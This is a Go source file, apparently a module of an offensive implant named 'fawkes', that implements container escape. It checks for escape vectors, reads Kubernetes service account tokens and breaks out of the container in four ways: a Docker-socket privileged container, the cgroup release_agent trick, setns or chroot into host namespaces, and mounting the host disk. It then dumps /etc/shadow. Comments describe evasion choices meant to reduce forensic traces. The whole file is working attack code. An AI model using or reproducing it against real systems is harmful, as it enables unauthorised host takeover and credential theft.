//go:build linux

package commands

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"time"

	"golang.org/x/sys/unix"

	"fawkes/pkg/structs"
)

// ContainerEscapeCommand attempts container escape techniques.
type ContainerEscapeCommand struct{}

func (c *ContainerEscapeCommand) Name() string { return "container-escape" }
func (c *ContainerEscapeCommand) Description() string {
	return "Attempt container escape via known breakout techniques"
}

type containerEscapeArgs struct {
	Action  string `json:"action"`
	Command string `json:"command"`
	Image   string `json:"image"`
	Path    string `json:"path"`
}

func (c *ContainerEscapeCommand) Execute(task structs.Task) structs.CommandResult {
	var args containerEscapeArgs
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return errorf("Failed to parse arguments: %v", err)
	}

	if args.Action == "" {
		args.Action = "check"
	}

	var output string
	var status string

	switch args.Action {
	case "check":
		output, status = escapeCheck()
	case "docker-sock":
		output, status = escapeDockerSock(args.Command, args.Image)
	case "cgroup":
		output, status = escapeCgroupNotify(args.Command)
	case "nsenter":
		output, status = escapeNsenter(args.Command)
	case "mount-host":
		output, status = escapeMountHost(args.Path)
	default:
		output = fmt.Sprintf("Unknown action: %s. Use: check, docker-sock, cgroup, nsenter, mount-host", args.Action)
		status = "error"
	}

	return structs.CommandResult{
		Output:    output,
		Status:    status,
		Completed: true,
	}
}

// escapeCheck enumerates all available escape vectors without exploiting them.
func escapeCheck() (string, string) {
	var sb strings.Builder
	sb.WriteString("=== CONTAINER ESCAPE VECTOR CHECK ===\n\n")

	vectors := 0

	// 1. Docker socket
	for _, sock := range []string{"/var/run/docker.sock", "/run/docker.sock"} {
		if info, err := os.Stat(sock); err == nil {
			mode := info.Mode()
			// Check if writable
			if mode&0o002 != 0 || (mode&0o020 != 0) {
				sb.WriteString(fmt.Sprintf("[!] Docker socket: %s (mode: %s) — WRITABLE\n", sock, mode))
				sb.WriteString("    Use: container-escape -action docker-sock -command '<cmd>'\n\n")
				vectors++
			} else {
				sb.WriteString(fmt.Sprintf("[*] Docker socket: %s (mode: %s) — exists but check permissions\n", sock, mode))
			}
		}
	}

	// 2. Privileged container (all capabilities + no seccomp)
	privileged := false
	if data, err := os.ReadFile("/proc/self/status"); err == nil {
		capEff := parseCapEff(string(data))
		if isFullCaps(capEff) {
			sb.WriteString("[!] Full capabilities detected — likely PRIVILEGED container\n")
			privileged = true
			vectors++
		}
	}

	// 3. Cgroup release_agent (privileged only)
	if privileged {
		// Check if we can write to cgroup
		if data, err := os.ReadFile("/proc/1/cgroup"); err == nil {
			cgroupPath := extractCgroupPath(string(data))
			if cgroupPath != "" {
				sb.WriteString(fmt.Sprintf("[!] Cgroup path: %s — release_agent escape may be possible\n", cgroupPath))
				sb.WriteString("    Use: container-escape -action cgroup -command '<cmd>'\n\n")
				vectors++
			}
		}
	}

	// 4. Host PID namespace (/proc/1/ns/pid check)
	if selfNS, err := os.Readlink("/proc/self/ns/pid"); err == nil {
		if hostNS, err := os.Readlink("/proc/1/ns/pid"); err == nil {
			if selfNS == hostNS {
				sb.WriteString("[!] Sharing PID namespace with host — nsenter escape possible\n")
				sb.WriteString("    Use: container-escape -action nsenter -command '<cmd>'\n\n")
				vectors++
			} else {
				sb.WriteString(fmt.Sprintf("[*] PID namespace: container=%s, host=%s (isolated)\n", selfNS, hostNS))
			}
		}
	}

	// 5. /proc/sysrq-trigger (host access indicator)
	if _, err := os.Stat("/proc/sysrq-trigger"); err == nil {
		// Check if writable
		if f, err := os.OpenFile("/proc/sysrq-trigger", os.O_WRONLY, 0); err == nil {
			f.Close()
			sb.WriteString("[!] /proc/sysrq-trigger is writable — host kernel access\n\n")
			vectors++
		}
	}

	// 6. Device access (privileged indicator)
	for _, dev := range []string{"/dev/sda", "/dev/vda", "/dev/xvda", "/dev/nvme0n1"} {
		if _, err := os.Stat(dev); err == nil {
			sb.WriteString(fmt.Sprintf("[!] Host block device accessible: %s\n", dev))
			sb.WriteString("    Use: container-escape -action mount-host -path /dev/sda\n\n")
			vectors++
			break
		}
	}

	// 7. K8s service account token
	tokenPath := "/var/run/secrets/kubernetes.io/serviceaccount/token"
	if data, err := os.ReadFile(tokenPath); err == nil {
		token := string(data)
		structs.ZeroBytes(data) // opsec: clear raw token bytes
		if len(token) > 50 {
			token = token[:50] + "..."
		}
		sb.WriteString(fmt.Sprintf("[!] K8s service account token found: %s\n", token))
		sb.WriteString("    Potential for K8s API abuse (pod creation, secret access)\n\n")
		structs.ZeroString(&token) // opsec: clear truncated token
		vectors++
	}

	// 8. K8s namespace/SA info
	if ns, err := os.ReadFile("/var/run/secrets/kubernetes.io/serviceaccount/namespace"); err == nil {
		sb.WriteString(fmt.Sprintf("[*] K8s namespace: %s\n", strings.TrimSpace(string(ns))))
	}

	// 9. Mounted host filesystems
	if data, err := os.ReadFile("/proc/mounts"); err == nil {
		for _, line := range strings.Split(string(data), "\n") {
			fields := strings.Fields(line)
			if len(fields) >= 2 {
				mountpoint := fields[1]
				// Look for host filesystem mounts
				if strings.HasPrefix(mountpoint, "/host") ||
					(strings.HasPrefix(mountpoint, "/") && fields[0] == "/dev/sda1") {
					sb.WriteString(fmt.Sprintf("[!] Potential host mount: %s → %s\n", fields[0], mountpoint))
					vectors++
				}
			}
		}
	}

	sb.WriteString(fmt.Sprintf("\n=== %d escape vector(s) identified ===\n", vectors))
	if vectors == 0 {
		sb.WriteString("No obvious escape vectors found. Container appears well-isolated.\n")
	}

	return sb.String(), "success"
}

// dockerUnixClient creates an HTTP client that communicates via a Unix socket.
// This avoids spawning curl for Docker API communication.
func dockerUnixClient(sockPath string) *http.Client {
	return &http.Client{
		Transport: &http.Transport{
			DialContext: func(ctx context.Context, _, _ string) (net.Conn, error) {
				return net.DialTimeout("unix", sockPath, 10*time.Second)
			},
		},
		Timeout: 60 * time.Second,
	}
}

// dockerAPIPost sends a POST request to the Docker API via Unix socket.
func dockerAPIPost(client *http.Client, path string, body []byte) ([]byte, error) {
	var bodyReader io.Reader
	if body != nil {
		bodyReader = bytes.NewReader(body)
	}
	resp, err := client.Post("http://docker"+path, "application/json", bodyReader)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	return io.ReadAll(resp.Body)
}

// dockerAPIGet sends a GET request to the Docker API via Unix socket.
func dockerAPIGet(client *http.Client, path string) ([]byte, error) {
	resp, err := client.Get("http://docker" + path)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	return io.ReadAll(resp.Body)
}

// dockerAPIDelete sends a DELETE request to the Docker API via Unix socket.
func dockerAPIDelete(client *http.Client, path string) {
	req, err := http.NewRequest("DELETE", "http://docker"+path, nil)
	if err != nil {
		return
	}
	resp, err := client.Do(req)
	if err != nil {
		return
	}
	resp.Body.Close()
}

// escapeDockerSock exploits a mounted Docker socket to run a command on the host.
// Uses native Go HTTP over Unix socket — zero child process spawns.
func escapeDockerSock(command, image string) (string, string) {
	if command == "" {
		return "Required: -command '<host command to run>'", "error"
	}
	if image == "" {
		image = "alpine"
	}

	// Find the socket
	sockPath := ""
	for _, sock := range []string{"/var/run/docker.sock", "/run/docker.sock"} {
		if _, err := os.Stat(sock); err == nil {
			sockPath = sock
			break
		}
	}
	if sockPath == "" {
		return "Docker socket not found at /var/run/docker.sock or /run/docker.sock", "error"
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[*] Using Docker socket: %s\n", sockPath))
	sb.WriteString(fmt.Sprintf("[*] Image: %s\n", image))
	sb.WriteString(fmt.Sprintf("[*] Command: %s\n\n", command))

	client := dockerUnixClient(sockPath)

	// Create container with host mount and run the command
	createJSON := fmt.Sprintf(`{"Image":"%s","Cmd":["/bin/sh","-c","%s"],"HostConfig":{"Binds":["/:/hostfs"],"Privileged":true}}`,
		image, strings.ReplaceAll(command, `"`, `\"`))

	out, err := dockerAPIPost(client, "/containers/create", []byte(createJSON))
	if err != nil {
		return fmt.Sprintf("Failed to create container: %v", err), "error"
	}

	// Parse container ID
	var createResp struct {
		ID string `json:"Id"`
	}
	if err := json.Unmarshal(out, &createResp); err != nil || createResp.ID == "" {
		return fmt.Sprintf("Failed to parse container creation response: %s", string(out)), "error"
	}
	containerID := createResp.ID[:12]
	sb.WriteString(fmt.Sprintf("[+] Container created: %s\n", containerID))

	// Start container
	if _, err := dockerAPIPost(client, fmt.Sprintf("/containers/%s/start", containerID), nil); err != nil {
		sb.WriteString(fmt.Sprintf("[!] Failed to start container: %v\n", err))
		return sb.String(), "error"
	}
	sb.WriteString("[+] Container started\n")

	// Wait for completion — log error but continue to get logs
	if _, err := dockerAPIPost(client, fmt.Sprintf("/containers/%s/wait", containerID), nil); err != nil {
		sb.WriteString(fmt.Sprintf("[!] Wait error (continuing): %v\n", err))
	}

	// Get logs
	logs, _ := dockerAPIGet(client, fmt.Sprintf("/containers/%s/logs?stdout=true&stderr=true", containerID))

	sb.WriteString("\n--- Output ---\n")
	// Docker logs have 8-byte header per line; strip it
	sb.WriteString(cleanDockerLogs(string(logs)))

	// Cleanup: remove container
	dockerAPIDelete(client, fmt.Sprintf("/containers/%s?force=true", containerID))
	sb.WriteString("\n[+] Container removed\n")

	return sb.String(), "success"
}

// escapeCgroupNotify uses the cgroup release_agent for host command execution (requires privileged).
func escapeCgroupNotify(command string) (string, string) {
	if command == "" {
		return "Required: -command '<host command to run>'", "error"
	}

	var sb strings.Builder
	sb.WriteString("[*] Attempting cgroup release_agent escape\n")

	// Create a temp cgroup
	cgroupDir, err := os.MkdirTemp("", "")
	if err != nil {
		return fmt.Sprintf("Failed to create cgroup dir: %v", err), "error"
	}

	// Mount a cgroup hierarchy
	if err := syscall.Mount("cgroup", cgroupDir, "cgroup", 0, "rdma"); err != nil {
		// Try memory controller instead
		if err := syscall.Mount("cgroup", cgroupDir, "cgroup", 0, "memory"); err != nil {
			os.Remove(cgroupDir)
			return fmt.Sprintf("Failed to mount cgroup: %v (need privileged container)", err), "error"
		}
	}
	sb.WriteString("[+] Cgroup mounted\n")

	// Create child cgroup
	childDir := filepath.Join(cgroupDir, "x")
	if err := os.MkdirAll(childDir, 0o755); err != nil {
		_ = syscall.Unmount(cgroupDir, 0)
		os.RemoveAll(cgroupDir)
		return fmt.Sprintf("Failed to create child cgroup: %v", err), "error"
	}

	// Get the container's path on the host filesystem
	hostPath := ""
	if data, err := os.ReadFile("/proc/self/cgroup"); err == nil {
		// Extract the overlay upperdir or similar
		for _, line := range strings.Split(string(data), "\n") {
			parts := strings.SplitN(line, ":", 3)
			if len(parts) == 3 && parts[2] != "/" {
				hostPath = parts[2]
				break
			}
		}
	}

	// Write the release_agent path
	// We need to know our path on the host — write a script that's accessible from host
	scriptFile, err := os.CreateTemp("", "")
	if err != nil {
		_ = syscall.Unmount(cgroupDir, 0)
		os.RemoveAll(cgroupDir)
		return fmt.Sprintf("Failed to create script temp file: %v", err), "error"
	}
	scriptPath := scriptFile.Name()
	scriptFile.Close()

	outputFile, err := os.CreateTemp("", "")
	if err != nil {
		secureRemove(scriptPath)
		_ = syscall.Unmount(cgroupDir, 0)
		os.RemoveAll(cgroupDir)
		return fmt.Sprintf("Failed to create output temp file: %v", err), "error"
	}
	outputPath := outputFile.Name()
	outputFile.Close()

	// Write script
	script := fmt.Sprintf("#!/bin/sh\n%s > %s 2>&1\n", command, outputPath)
	if err := os.WriteFile(scriptPath, []byte(script), 0o755); err != nil {
		secureRemove(outputPath)
		_ = syscall.Unmount(cgroupDir, 0)
		os.RemoveAll(cgroupDir)
		return fmt.Sprintf("Failed to write escape script: %v", err), "error"
	}

	// The release_agent needs the full host path to the script
	// This is the tricky part — we need to figure out our overlay path on the host
	releaseAgentScript := scriptPath
	if hostPath != "" {
		// For overlay containers, the script is at the merged path
		sb.WriteString(fmt.Sprintf("[*] Container cgroup path: %s\n", hostPath))
	}

	// Set release_agent
	releaseAgentPath := filepath.Join(cgroupDir, "release_agent")
	if err := os.WriteFile(releaseAgentPath, []byte(releaseAgentScript), 0o644); err != nil {
		secureRemove(scriptPath)
		_ = syscall.Unmount(cgroupDir, 0)
		os.RemoveAll(cgroupDir)
		return fmt.Sprintf("Failed to set release_agent: %v", err), "error"
	}
	sb.WriteString("[+] release_agent set\n")

	// Enable notify_on_release
	notifyPath := filepath.Join(childDir, "notify_on_release")
	if err := os.WriteFile(notifyPath, []byte("1"), 0o644); err != nil {
		secureRemove(scriptPath)
		_ = syscall.Unmount(cgroupDir, 0)
		os.RemoveAll(cgroupDir)
		return fmt.Sprintf("Failed to enable notify_on_release: %v", err), "error"
	}

	// Trigger by writing our PID to child cgroup then removing it
	cgroupProcs := filepath.Join(childDir, "cgroup.procs")
	if err := os.WriteFile(cgroupProcs, []byte(fmt.Sprintf("%d", os.Getpid())), 0o644); err != nil {
		sb.WriteString(fmt.Sprintf("[-] Warning: failed to write to child cgroup.procs: %v\n", err))
	}

	// Move back to parent and remove child to trigger release
	parentProcs := filepath.Join(cgroupDir, "cgroup.procs")
	if err := os.WriteFile(parentProcs, []byte(fmt.Sprintf("%d", os.Getpid())), 0o644); err != nil {
		sb.WriteString(fmt.Sprintf("[-] Warning: failed to write to parent cgroup.procs: %v\n", err))
	}
	os.Remove(childDir)

	sb.WriteString("[+] Triggered release_agent\n")

	// Check for output
	if data, err := os.ReadFile(outputPath); err == nil {
		sb.WriteString("\n--- Output ---\n")
		sb.WriteString(string(data))
	} else {
		sb.WriteString("[!] No output file — release_agent may not have fired (host path resolution issue)\n")
		sb.WriteString("    This technique requires the script path to be valid on the host filesystem\n")
	}
	secureRemove(outputPath)

	// Cleanup
	secureRemove(scriptPath)
	_ = syscall.Unmount(cgroupDir, 0)
	os.RemoveAll(cgroupDir)

	return sb.String(), "success"
}

// nsNamespace maps namespace names to their clone flags for setns().
type nsNamespace struct {
	name string
	flag int
}

// hostNamespaces are the Linux namespaces to enter for full host context.
var hostNamespaces = []nsNamespace{
	{"mnt", unix.CLONE_NEWNS},
	{"uts", unix.CLONE_NEWUTS},
	{"ipc", unix.CLONE_NEWIPC},
	{"net", unix.CLONE_NEWNET},
	// PID namespace change only affects children, not current process
	{"pid", unix.CLONE_NEWPID},
}

// escapeNsenter enters the host namespaces to run a command.
// Uses direct setns() syscalls instead of spawning nsenter/chroot binaries,
// reducing the process tree footprint to just /bin/sh.
func escapeNsenter(command string) (string, string) {
	if command == "" {
		return "Required: -command '<host command to run>'", "error"
	}

	// Check if we share PID namespace with host
	selfNS, err := os.Readlink("/proc/self/ns/pid")
	if err != nil {
		return fmt.Sprintf("Cannot read PID namespace: %v", err), "error"
	}
	hostNS, err := os.Readlink("/proc/1/ns/pid")
	if err != nil {
		return fmt.Sprintf("Cannot read host PID namespace: %v", err), "error"
	}
	if selfNS != hostNS {
		return fmt.Sprintf("PID namespaces differ (self=%s, host=%s) — nsenter not available", selfNS, hostNS), "error"
	}

	// Try setns approach first (enters host namespaces directly via syscall)
	output, status := nsenterViaSetns(command)
	if status == "success" {
		return output, status
	}

	// Fallback: use SysProcAttr.Chroot to chroot into /proc/1/root
	// This avoids spawning the chroot binary — Go handles it internally
	if _, err := os.Stat("/proc/1/root"); err == nil {
		ctx, cancel := context.WithTimeout(context.Background(), defaultExecTimeout)
		defer cancel()
		cmd := exec.CommandContext(ctx, "/proc/1/root/bin/sh", "-c", command)
		cmd.SysProcAttr = &syscall.SysProcAttr{
			Chroot: "/proc/1/root",
		}
		cmd.Dir = "/"
		out, err := cmd.CombinedOutput()
		if err != nil {
			return fmt.Sprintf("setns failed (%s), chroot fallback also failed: %v\n%s", output, err, string(out)), "error"
		}
		return fmt.Sprintf("[+] Executed via chroot /proc/1/root (syscall, no chroot binary)\n\n--- Output ---\n%s", string(out)), "success"
	}

	return fmt.Sprintf("Both setns and chroot approaches failed: %s", output), "error"
}

// nsenterViaSetns enters host namespaces using direct setns() syscalls and runs
// the command. The goroutine is pinned to its OS thread to ensure namespace
// changes are consistent, and original namespaces are restored afterward.
func nsenterViaSetns(command string) (string, string) {
	// Pin this goroutine to a single OS thread — namespace operations are per-thread
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	// Save original namespace FDs so we can restore after the command
	origFDs := make(map[string]int)
	for _, ns := range hostNamespaces {
		fd, err := unix.Open(fmt.Sprintf("/proc/self/ns/%s", ns.name), unix.O_RDONLY, 0)
		if err == nil {
			origFDs[ns.name] = fd
		}
	}
	defer func() {
		// Restore original namespaces (best-effort — failure here means
		// the thread stays in host namespaces, but LockOSThread prevents
		// that from affecting other goroutines)
		for _, ns := range hostNamespaces {
			if fd, ok := origFDs[ns.name]; ok {
				_ = unix.Setns(fd, ns.flag)
				unix.Close(fd)
			}
		}
	}()

	// Enter host namespaces via setns()
	entered := 0
	for _, ns := range hostNamespaces {
		hostPath := fmt.Sprintf("/proc/1/ns/%s", ns.name)
		fd, err := unix.Open(hostPath, unix.O_RDONLY, 0)
		if err != nil {
			continue
		}
		if err := unix.Setns(fd, ns.flag); err != nil {
			unix.Close(fd)
			continue
		}
		unix.Close(fd)
		entered++
	}

	if entered == 0 {
		return "setns: could not enter any host namespaces", "error"
	}

	// Run command — child process inherits our (now host) namespaces
	ctx, cancel := context.WithTimeout(context.Background(), defaultExecTimeout)
	defer cancel()
	cmd := exec.CommandContext(ctx, "/bin/sh", "-c", command)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("setns succeeded (%d namespaces) but command failed: %v\n%s", entered, err, string(out)), "error"
	}

	return fmt.Sprintf("[+] Executed via setns (%d host namespaces entered, no nsenter binary)\n\n--- Output ---\n%s", entered, string(out)), "success"
}

// escapeMountHost mounts a host block device to access the host filesystem.
func escapeMountHost(devicePath string) (string, string) {
	if devicePath == "" {
		// Auto-detect
		for _, dev := range []string{"/dev/sda1", "/dev/vda1", "/dev/xvda1", "/dev/nvme0n1p1", "/dev/sda", "/dev/vda"} {
			if _, err := os.Stat(dev); err == nil {
				devicePath = dev
				break
			}
		}
		if devicePath == "" {
			return "No host block device found. Specify with -path /dev/sdX", "error"
		}
	}

	mountPoint, err := os.MkdirTemp("", "")
	if err != nil {
		return fmt.Sprintf("Failed to create mount point: %v", err), "error"
	}

	// Mount the device
	if err := syscall.Mount(devicePath, mountPoint, "ext4", syscall.MS_RDONLY, ""); err != nil {
		// Try xfs
		if err := syscall.Mount(devicePath, mountPoint, "xfs", syscall.MS_RDONLY, ""); err != nil {
			os.Remove(mountPoint)
			return fmt.Sprintf("Failed to mount %s: %v (need CAP_SYS_ADMIN)", devicePath, err), "error"
		}
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[+] Mounted %s at %s (read-only)\n\n", devicePath, mountPoint))

	// List interesting files
	interesting := []string{
		"/etc/shadow",
		"/etc/passwd",
		"/root/.ssh/authorized_keys",
		"/root/.bash_history",
		"/etc/kubernetes",
	}

	sb.WriteString("--- Host filesystem contents ---\n")
	for _, path := range interesting {
		fullPath := filepath.Join(mountPoint, path)
		if info, err := os.Stat(fullPath); err == nil {
			sb.WriteString(fmt.Sprintf("  [FOUND] %s (%d bytes)\n", path, info.Size()))
		}
	}

	// Read /etc/shadow if possible
	shadowPath := filepath.Join(mountPoint, "etc/shadow")
	if data, err := os.ReadFile(shadowPath); err == nil {
		lines := strings.Split(string(data), "\n")
		sb.WriteString(fmt.Sprintf("\n--- /etc/shadow (%d entries) ---\n", len(lines)))
		for _, line := range lines {
			if line != "" {
				sb.WriteString(line + "\n")
			}
		}
	}

	sb.WriteString(fmt.Sprintf("\n[*] Host filesystem mounted at %s — use cat/ls to explore\n", mountPoint))
	sb.WriteString("[*] Remember to clean up: unmount when done\n")

	return sb.String(), "success"
}

// extractCgroupPath, cleanDockerLogs moved to container_escape_helpers.go
